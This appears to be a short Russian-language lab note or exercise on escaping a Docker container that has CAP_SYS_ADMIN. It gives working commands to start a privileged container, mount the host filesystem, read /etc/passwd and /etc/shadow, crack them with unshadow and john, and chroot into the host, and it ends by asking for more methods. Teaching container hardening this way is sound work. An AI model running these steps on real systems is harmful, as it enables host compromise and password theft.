# CAP_SYS_ADMIN

Прсомотр capabilities в контейнере
```bash
capsh --print
```

### В контейнере с предоставленной возможностью CAP_SYS_ADMIN можно попытаться монтировать файловую систему хост-системы внутри контейнера

Запуск контейнера на хосте:
```bash
# Run vulnarable container on host
docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --device=/dev/:/ --rm ubuntu_golden_image:v01 bash
```

Монтируем хостовую файловую систему
```bash
lsblk
mount /<device_file> /mnt
cd /mnt
ls -la
```

Далее можем делать что угодно, насколько хватит фантазии
Пример (расшифровать пароли):
```
unshadow /mnt/etc/passwd /mnt/etc/shadow > password
john password --format=crypt
```

```bash
chroot /mnt
```

### Задание: предложить еще способы